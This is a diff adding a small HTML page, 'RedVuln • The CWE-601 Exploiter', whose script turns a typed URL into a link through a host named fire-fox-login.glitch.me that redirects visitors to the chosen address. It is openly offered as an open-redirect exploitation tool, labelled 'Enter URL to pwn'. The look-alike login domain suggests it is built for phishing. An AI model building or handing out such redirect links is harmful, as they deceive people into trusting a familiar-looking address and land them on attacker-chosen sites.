@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RedVuln</title>
+    <link href="https://unpkg.com/nes.css@latest/css/nes.min.css" rel="stylesheet" />
+    <link rel="icon" href="favicon.ico">
+
+    <style>
+        @import url(https://fonts.googleapis.com/css?family=Press+Start+2P);
+
+        * {
+            font-family: "Press Start 2P";
+            outline: none;
+        }
+
+        .nes-container {
+            width: 85%;
+            box-shadow: -23px 23px 0px 4px #000000;
+        }
+
+        .is-primary {
+            font-size: 10px;
+        }
+
+        .note{
+            font-size:13px;
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <br><br>
+
+    <center>
+        <p class="title">RedVuln • The CWE-601 Exploiter</p>
+
+        <div class="nes-container">
+            <div class="nes-field">
+                <label for="name_field">Redirection URL</label>
+                <label class = "note">Use `https://`</label>
+                <input type="text" id="name_field" class="nes-input" oninput="pwned()">
+                <br>
+                <a class="nes-text is-primary" id="pwn" href="">Enter URL to pwn</a>
+            </div>
+        </div>
+        <br><br><br>
+        <div class="nes-container"><p style="font-style: italic; text-align: center;">"With great power comes great responsibility."</p></div>
+    </center>
+    <script>
+        function pwned() {
+            document.getElementById("pwn").innerHTML = "https://fire-fox-login.glitch.me/?url=" + document.getElementById("name_field").value
+            document.getElementById("pwn").href = "https://fire-fox-login.glitch.me/?url=" + document.getElementById("name_field").value
+        }
+    </script>
+    
+    
+</body>
+
+</html>
